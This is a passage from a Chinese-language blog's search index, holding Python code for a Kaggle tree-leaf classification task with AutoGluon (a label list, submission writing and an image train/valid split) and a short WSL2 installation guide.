class="string">&#x27;acer_pseudoplatanus&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_rubrum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_saccharinum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;acer_saccharum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;aesculus_flava&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;aesculus_glabra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;aesculus_hippocastamon&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;aesculus_pavi&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ailanthus_altissima&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;albizia_julibrissin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;amelanchier_arborea&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;amelanchier_canadensis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;amelanchier_laevis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;asimina_triloba&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;betula_alleghaniensis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;betula_jacqemontii&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;betula_lenta&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;betula_nigra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;betula_populifolia&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;broussonettia_papyrifera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;carpinus_betulus&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;carpinus_caroliniana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;carya_cordiformis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;carya_glabra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;carya_ovata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;carya_tomentosa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;castanea_dentata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;catalpa_bignonioides&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;catalpa_speciosa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cedrus_atlantica&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cedrus_deodara&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cedrus_libani&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;celtis_occidentalis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;celtis_tenuifolia&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cercidiphyllum_japonicum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cercis_canadensis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;chamaecyparis_pisifera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;chamaecyparis_thyoides&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;chionanthus_retusus&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;chionanthus_virginicus&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cladrastis_lutea&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cornus_florida&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cornus_kousa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cornus_mas&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;crataegus_crus-galli&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;crataegus_laevigata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;crataegus_phaenopyrum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;crataegus_pruinosa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;crataegus_viridis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cryptomeria_japonica&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;diospyros_virginiana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;eucommia_ulmoides&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;evodia_daniellii&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;fagus_grandifolia&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ficus_carica&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;fraxinus_nigra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;fraxinus_pennsylvanica&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ginkgo_biloba&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;gleditsia_triacanthos&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;gymnocladus_dioicus&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;halesia_tetraptera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ilex_opaca&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;juglans_cinerea&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;juglans_nigra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;juniperus_virginiana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;koelreuteria_paniculata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;larix_decidua&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;liquidambar_styraciflua&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;liriodendron_tulipifera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;maclura_pomifera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;magnolia_acuminata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;magnolia_denudata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;magnolia_grandiflora&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;magnolia_macrophylla&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;magnolia_stellata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;magnolia_tripetala&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;magnolia_virginiana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;malus_baccata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;malus_coronaria&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;malus_floribunda&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;malus_hupehensis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;malus_pumila&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;metasequoia_glyptostroboides&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;morus_alba&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;morus_rubra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;nyssa_sylvatica&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ostrya_virginiana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;oxydendrum_arboreum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;paulownia_tomentosa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;phellodendron_amurense&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;picea_abies&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;picea_orientalis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;picea_pungens&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_bungeana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_cembra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_densiflora&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_echinata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_flexilis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_koraiensis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_nigra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_parviflora&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_peucea&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_pungens&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_resinosa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_rigida&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_strobus&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_sylvestris&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_taeda&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_thunbergii&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_virginiana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pinus_wallichiana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;platanus_acerifolia&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;platanus_occidentalis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;populus_deltoides&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;populus_grandidentata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;populus_tremuloides&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;prunus_pensylvanica&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;prunus_sargentii&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;prunus_serotina&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;prunus_serrulata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;prunus_subhirtella&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;prunus_virginiana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;prunus_yedoensis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pseudolarix_amabilis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ptelea_trifoliata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pyrus_calleryana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_acutissima&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_alba&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_bicolor&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_cerris&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_coccinea&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_imbricaria&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_macrocarpa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_marilandica&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_michauxii&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_montana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_muehlenbergii&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_nigra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_palustris&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_phellos&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_robur&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_shumardii&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_stellata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_velutina&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;quercus_virginiana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;robinia_pseudo-acacia&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;salix_babylonica&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;salix_caroliniana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;salix_matsudana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;salix_nigra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sassafras_albidum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;staphylea_trifolia&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;stewartia_pseudocamellia&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;styrax_japonica&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;taxodium_distichum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tilia_americana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tilia_cordata&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tilia_europaea&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tilia_tomentosa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tsuga_canadensis&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ulmus_americana&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ulmus_glabra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ulmus_parvifolia&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ulmus_procera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ulmus_pumila&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ulmus_rubra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;zelkova_serrata&#x27;</span>]</span><br><span class="line"></span><br><span class="line">a = pd.read_csv(<span class="string">&#x27;./data/test.csv&#x27;</span>)</span><br><span class="line">b = pd.read_csv(<span class="string">&#x27;./submission.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">id</span>.append(a[<span class="string">&#x27;image&#x27;</span>][i])</span><br><span class="line"></span><br><span class="line">label=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    label.append(<span class="built_in">str</span>(label_list[<span class="built_in">int</span>(b[<span class="string">&#x27;category&#x27;</span>][i])]))</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;image&#x27;</span>:<span class="built_in">id</span>,<span class="string">&#x27;label&#x27;</span>:label&#125;)</span><br><span class="line"></span><br><span class="line">df.to_csv(<span class="string">&quot;test.csv&quot;</span>,index=<span class="literal">False</span>,sep=<span class="string">&#x27;,&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>使用AutoGluon，在valid_dataset上准确率为95%</p></li><li><p>使用submission.csv上传kaggle</p></li></ol><h2 id="整理图片代码："><a href="#整理图片代码：" class="headerlink" title="整理图片代码："></a>整理图片代码：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_csv_labels</span>(<span class="params">fname</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;读取 `fname` 来给标签字典返回一个文件名。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># 跳过文件头行 (列名)</span></span><br><span class="line">        lines = f.readlines()[<span class="number">1</span>:]</span><br><span class="line">    tokens = [l.rstrip().split(<span class="string">&#x27;,&#x27;</span>) <span class="keyword">for</span> l <span class="keyword">in</span> lines]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(((name, label) <span class="keyword">for</span> name, label <span class="keyword">in</span> tokens))</span><br><span class="line"></span><br><span class="line">data_dir=<span class="string">&#x27;./data&#x27;</span></span><br><span class="line">labels = read_csv_labels(os.path.join(data_dir, <span class="string">&#x27;train.csv&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;# 训练示例 :&#x27;</span>, <span class="built_in">len</span>(labels))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;# 类别 :&#x27;</span>, <span class="built_in">len</span>(<span class="built_in">set</span>(labels.values())))</span><br><span class="line"></span><br><span class="line"><span class="comment">#@save</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copyfile</span>(<span class="params">filename, target_dir</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;将文件复制到目标目录。&quot;&quot;&quot;</span></span><br><span class="line">    os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    shutil.copy(filename, target_dir)</span><br><span class="line"></span><br><span class="line"><span class="comment">#@save</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reorg_train_valid</span>(<span class="params">data_dir, labels, valid_ratio</span>):</span></span><br><span class="line">    <span class="comment"># 训练数据集中示例最少的类别中的示例数</span></span><br><span class="line">    n = collections.Counter(labels.values()).most_common()[-<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 验证集中每个类别的示例数</span></span><br><span class="line">    n_valid_per_label = <span class="built_in">max</span>(<span class="number">1</span>, math.floor(n * valid_ratio))</span><br><span class="line">    label_count = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> train_file <span class="keyword">in</span> os.listdir(os.path.join(data_dir ,<span class="string">&#x27;images&#x27;</span>)):</span><br><span class="line">        fname = os.path.join(data_dir, <span class="string">&#x27;images&#x27;</span>, train_file)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            label = labels[<span class="string">&#x27;images/&#x27;</span> + train_file]</span><br><span class="line">            copyfile(</span><br><span class="line">                fname,</span><br><span class="line">                os.path.join(data_dir, <span class="string">&#x27;train_valid_test&#x27;</span>, <span class="string">&#x27;train_valid&#x27;</span>, label))</span><br><span class="line">            <span class="keyword">if</span> label <span class="keyword">not</span> <span class="keyword">in</span> label_count <span class="keyword">or</span> label_count[label] &lt; n_valid_per_label:</span><br><span class="line">                copyfile(</span><br><span class="line">                    fname,</span><br><span class="line">                    os.path.join(data_dir, <span class="string">&#x27;train_valid_test&#x27;</span>, <span class="string">&#x27;valid&#x27;</span>, label))</span><br><span class="line">                label_count[label] = label_count.get(label, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                copyfile(</span><br><span class="line">                    fname,</span><br><span class="line">                    os.path.join(data_dir, <span class="string">&#x27;train_valid_test&#x27;</span>, <span class="string">&#x27;train&#x27;</span>, label))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            copyfile(</span><br><span class="line">                fname,</span><br><span class="line">                os.path.join(data_dir, <span class="string">&#x27;train_valid_test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;unknown&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> n_valid_per_label</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reorg_cifar10_data</span>(<span class="params">data_dir, valid_ratio</span>):</span></span><br><span class="line">    labels = read_csv_labels(os.path.join(data_dir, <span class="string">&#x27;train.csv&#x27;</span>))</span><br><span class="line">    reorg_train_valid(data_dir, labels, valid_ratio)</span><br><span class="line"></span><br><span class="line">batch_size = <span class="number">64</span></span><br><span class="line">valid_ratio = <span class="number">0.5</span></span><br><span class="line">reorg_cifar10_data(data_dir, valid_ratio)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> AutoGluon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl2的安装</title>
      <link href="/2021/05/18/wsl2%E7%9A%84%E5%AE%89%E8%A3%85/"/>
      <url>/2021/05/18/wsl2%E7%9A%84%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="wsl2的安装"><a href="#wsl2的安装" class="headerlink" title="wsl2的安装"></a>wsl2的安装</h1><p><a href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-install">微软官方教程</a></p><p>教程大抵如下</p><ol><li><p>控制面板 添加或关闭windows功能 确认 &lt;适用于linux的windows子系统&gt; &lt;虚拟机平台&gt; 两项功能支持被添加</p></li><li><p>重启电脑 使更改生效</p></li><li><p>更改 wsl默认版本 <code>wsl --set-default-version 2</code></p></li><li><p>从商店中安装发行版安装包，或者 <code>wsl --set-version &lt;Distro&gt; 2</code> 对已有发行进行版本升级</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wsl2 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
